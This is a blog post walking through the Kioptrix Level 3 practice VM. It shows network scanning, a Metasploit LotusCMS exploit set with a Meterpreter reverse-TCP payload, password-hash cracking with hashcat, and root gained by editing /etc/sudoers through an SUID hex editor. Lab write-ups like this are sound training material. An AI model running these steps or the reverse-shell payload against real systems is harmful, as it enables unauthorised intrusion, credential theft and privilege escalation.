---
layout: post
title: "vulhub-Kioptrix Level 3"
date: 2016-06-09 11:42:38 -0500
comments: true
categories: [vulhub, suid, kioptrix]
---

###Tools:

* netdiscover
* Nmap
* Nikto
* Metasploit
* Wfuzz
* Hashcat

<!--more-->

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/vulhub/kioptrix3/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.184 is the target.


Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.184 -p-`


{% img  /images/blog/vulhub/kioptrix3/Selection_002.png   [title manually exploit [alt text]] %}


Ports 22 and 80 are opening.


Now use Nikto to scan:

`nikto -h 192.168.79.184`

{% img  /images/blog/vulhub/kioptrix3/Selection_003.png   [title manually exploit [alt text]] %}

Nothing excited.

Now lets browser the web page in the target.

{% img  /images/blog/vulhub/kioptrix3/Selection_004.png   [title manually exploit [alt text]] %}


{% img  /images/blog/vulhub/kioptrix3/Selection_005.png   [title manually exploit [alt text]] %}

Find the target may use LotusCMS.

In msfconsole:

`search LotusCMS`

{% img  /images/blog/vulhub/kioptrix3/Selection_006.png   [title manually exploit [alt text]] %}

find one exploit

```
msf > use exploit/multi/http/lcms_php_exec 
msf exploit(lcms_php_exec) > set rhost 192.168.79.184
msf exploit(lcms_php_exec) > set uri 
msf exploit(lcms_php_exec) > set payload php/meterpreter/reverse_tcp
msf exploit(lcms_php_exec) > set lhost 192.168.79.173
exploit
```

{% img  /images/blog/vulhub/kioptrix3/Selection_007.png   [title manually exploit [alt text]] %}

Got the shell, next step is try to get root.

In this step, I tried to enumeration all kinds of shit and use serveral vernerable kernel exploits to get the root but failed. During the emumeration. I found a ffile gconfig.php is interesting. Then I found that:


{% img  /images/blog/vulhub/kioptrix3/Selection_009.png   [title manually exploit [alt text]] %}

maybe the  username/password for ssh, but no. Thats too easy.

So that I go back to use wfuzz the scan the http services.

{% img  /images/blog/vulhub/kioptrix3/Selection_008.png   [title manually exploit [alt text]] %}

Looks like it has phpmyadmin. Try that:

{% img  /images/blog/vulhub/kioptrix3/Selection_010.png   [title manually exploit [alt text]] %}

Log in using the username/password that just found. Successed.

review the content, found this:

{% img  /images/blog/vulhub/kioptrix3/Selection_011.png   [title manually exploit [alt text]] %}


now found two users and the hashed passwords:

{% img  /images/blog/vulhub/kioptrix3/Selection_012.png   [title manually exploit [alt text]] %}

Copy the passwords to a file use hashcat to crack it:


`hashcat hash.txt /user/share/wordlists/rockyou.txt`


get both passwords:


{% img  /images/blog/vulhub/kioptrix3/Selection_013.png   [title manually exploit [alt text]] %}

{% img  /images/blog/vulhub/kioptrix3/Selection_014.png   [title manually exploit [alt text]] %}

ssh to the target, search the SUID binaries:

`find / -perm +6000 -type f -exec ls -ld {} \;`

found an interesting file /uss/local/bin/ht, I googled it and found it is a hex editor.

now try to use it to open /etc/sudoers file, get error message. to fix it:

`export TERM=xterm`

change the loneferret permission:


{% img  /images/blog/vulhub/kioptrix3/Selection_020.png   [title manually exploit [alt text]] %}

get the root


{% img  /images/blog/vulhub/kioptrix3/Selection_021.png   [title manually exploit [alt text]] %}

DONE















